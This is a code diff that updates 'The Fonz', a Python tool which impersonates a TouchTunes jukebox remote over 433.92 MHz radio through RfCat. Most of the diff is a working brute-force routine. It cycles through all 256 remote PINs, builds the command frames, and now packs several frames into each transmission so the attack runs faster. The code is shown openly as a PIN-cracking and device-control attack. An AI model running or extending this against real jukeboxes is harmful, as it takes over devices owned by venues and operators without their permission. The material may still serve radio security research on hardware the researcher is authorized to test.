@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-#The Fonz, a friendly TouchTunes Remote emulation tool used for finding PIN's, brute forcing, and genural jukebox control.
+#The Fonz, a friendly TouchTunes Remote imulation tool used for finding PIN's, brute forcing, and genural jukebox control.
 #TouchTunes remotes TX at 433.92Mhz, uses ASK/OOK and uses a pin (000-255) for "security". 
 #This script was meant to be used with RfCat and the Yard Stick One.
 
@@ -34,7 +34,7 @@ banner = """    _____ _            _____
    |_   _| |__   ___  |  ___|__  _ __  ____
      | | | '_ \ / _ \ | |_ / _ \| '_ \|_  /
      | | | | | |  __/ |  _| (_) | | | |/ / 
-     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.5
+     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.6
 
 "Arthur, it's morning, have you been here all night?"
               Slect a number to begin!\n"""
@@ -207,47 +207,12 @@ def TX(data, repeat=0):
         d.setMdmSyncWord(0)
         d.setMaxPower()
         d.RFxmit(data, repeat)
+        print '<*> TX'
 
 
 #Trys every PIN for a command
-def BruteForceThisMotherFucker():
+def BruteForceThisMotherFucker(CommandZero,CommandOne):
 
-        items = commands.keys()
-        items.sort(reverse=1) #anti-alphabetical order
-        choice = 0
-        for button in items:
-                choice +=1
-                print '%i.) %s' %(choice, button)
-        print '%i.) Back \n' %(choice+1)
-        loop = True
-        while loop:
-                try:
-                        CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
-                        if int(CommandAns) <= choice and int(CommandAns) >= 1:
-                                KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
-                                value = commands[str(KeyButton)]
-                                CommandZero = value[0]
-                                CommandOne = value[1]
-                                loop = False                                
-                        elif int(CommandAns) == choice+1:
-                                loop = False
-                                MainMenu()
-                        else:
-                                print "Not a valid choice, please try again... \n"
-                                time.sleep(.5)                                
-                except ValueError:
-                        print "Not a valid choice, please try again... \n"
-                        time.sleep(.5)
-                        pass
-
-        loop2 = True
-        while loop2:
-                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
-                TxAns = raw_input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
-                if str.lower(TxAns) == 'n':
-                        loop2 = False
-                        MainMenu()
-                elif str.lower(TxAns) == 'y':
                         os.system('clear')
                         print "\n\"What day is today?\" asked Pooh"
                         time.sleep(1)
@@ -259,6 +224,7 @@ def BruteForceThisMotherFucker():
 
                         start = int(time.time())
                         PinCounter = 0
+                        GroupCommand = '00'
                         for pin in nukecodes:
                                 if WhichCommand[PinCounter] == 0:
                                         BruteCommand = CommandZero
@@ -266,19 +232,27 @@ def BruteForceThisMotherFucker():
                                         BruteCommand = CommandOne
                                 FullCommand = 'ffff00a2888a2'+pin+BruteCommand
                                 if len(FullCommand) % 2 != 0: #Makes sure things are even
-                                        FullCommand = FullCommand+'0'
-				print FullCommand
-                                TX(FullCommand.decode('hex'))
-                                PinCounter +=1
+                                        FullCommand += '0'
+                                
+                                if len(GroupCommand) <= 255-len(FullCommand): #how many hex ch in 8bit
+                                        #print FullCommand
+                                        GroupCommand += FullCommand
+                                        #print len(GroupCommand)
+                                        PinCounter +=1
+
+                                else:
+                                        print GroupCommand + '\n'
+                                        TX(GroupCommand.decode('hex'))
+                                        GroupCommand = FullCommand
+                                        PinCounter +=1
+
+
+                        print GroupCommand + '\n'
                         stop = int(time.time())
                         TotalTime = stop-start
                         print "<*> BRUTE FORCE COMPLETE! TIME: %isec\n" %(TotalTime)
                         loop2 = False
                         MainMenu()
-                else:
-                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
-                        sys.exit()
-
                         
 
 def MainMenu():
@@ -314,7 +288,7 @@ def MainMenu():
 def TxMenu():
         pin = PinMenu()
         if pin == 999:
-                BruteForceThisMotherFucker()
+                BruteMenu()
                 MainMenu()
         command = CommandMenu()
         repeat = TimesMenu()
@@ -421,10 +395,55 @@ def TimesMenu():
                         print "Not a valid choice, please try again... \n"
                         time.sleep(.5)
                         pass        
-       
 
-os.system('clear')
-print(banner)
-MainMenu()
+
+def BruteMenu():
+       
+        items = commands.keys()
+        items.sort(reverse=1) #anti-alphabetical order
+        choice = 0
+        for button in items:
+                choice +=1
+                print '%i.) %s' %(choice, button)
+        print '%i.) Back \n' %(choice+1)
+        loop = True
+        while loop:
+                try:
+                        CommandAns=raw_input('Pick a command. Select [1-%i]: ' %(choice+1))
+                        if int(CommandAns) <= choice and int(CommandAns) >= 1:
+                                KeyButton = items[int(CommandAns)-1] #the chosen command in the items list
+                                value = commands[str(KeyButton)]
+                                CommandZero = value[0]
+                                CommandOne = value[1]
+                                loop = False                                
+                        elif int(CommandAns) == choice+1:
+                                loop = False
+                                MainMenu()
+                        else:
+                                print "Not a valid choice, please try again... \n"
+                                time.sleep(.5)                                
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass
+
+        loop2 = True
+        while loop2:
+                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
+                TxAns = raw_input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
+                if str.lower(TxAns) == 'n':
+                        loop2 = False
+                        MainMenu()
+                elif str.lower(TxAns) == 'y':
+                        BruteForceThisMotherFucker(CommandZero,CommandOne)
+                else:
+                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        sys.exit()
+
+
+if __name__ == '__main__':
+        os.system('clear')
+        print(banner)
+        MainMenu()
 
 
